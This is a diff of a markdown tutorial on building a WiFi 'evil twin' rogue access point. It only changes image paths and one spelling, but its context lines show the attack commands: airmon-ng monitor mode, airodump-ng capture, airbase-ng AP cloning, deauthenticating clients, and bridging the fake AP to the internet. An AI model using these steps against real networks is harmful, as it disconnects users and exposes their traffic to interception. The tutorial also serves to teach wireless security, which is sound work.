@@ -16,7 +16,7 @@ Steps:
   1. To show available wireless interfaces run:
     `iwconfig`
 
-    <img src="img/iwconfig.jpg"/>
+  <img src="/img/iwconfig.jpg"/>
 
   2. Start monitor mode on the available WiFi device.
     Run:
@@ -25,18 +25,18 @@ Steps:
     Also make note of any alerts like:
       `Found 3 processes that could cause trouble.`
 
-      <img src="img/airmonstart.jpg"/>
+      <img src="/img/airmonstart.jpg"/>
 
       "Kill" those processes, they may interfere they may not, you will need to restart the dhclient later:
         `airmon-ng check kill`
       Then re-run:
         `airmon-ng start wlan1`
-      <img src="img/airmonstart2.jpg"/>
+      <img src="/img/airmonstart2.jpg"/>
   3. Capture packets from the air using the device you put in monitor mode.
       - Run:
         `airodump-ng wlan1mon`
 
-        <img src="img/capturepackets.jpg"/>
+        <img src="/img/capturepackets.jpg"/>
 
       - After about half a minute enter `control + c` and open a new terminal
 
@@ -46,7 +46,7 @@ Steps:
 
   Run:
           `airbase-ng -a [BSSID] --essid <ESSID here> -c <channel here> <interface name>`
-5. Deauthenticate the client
+5. De-authenticate the client
 For this I am using my phone as the client that is the target of the attack.
           Run:
 
@@ -56,7 +56,7 @@ For this I am using my phone as the client that is the target of the attack.
 
 This will disconnect all clients from the network
 
-  <img src="img/deauth.jpg"/>
+<img src="/img/deauth.jpg"/>
 
   6. Give the "evil twin" internet access
     This will provide internet access to the fake Access Point and allow clients to connect thinking they're accessing the real Access Point.
@@ -86,4 +86,4 @@ This will disconnect all clients from the network
         `dhclient evil &`
 
         This completes the set up for the attack. You can see my phone connecting to the "Evil twin"
-<img src="img/phone.jpg"/>
+<img src="/img/phone.jpg"/>
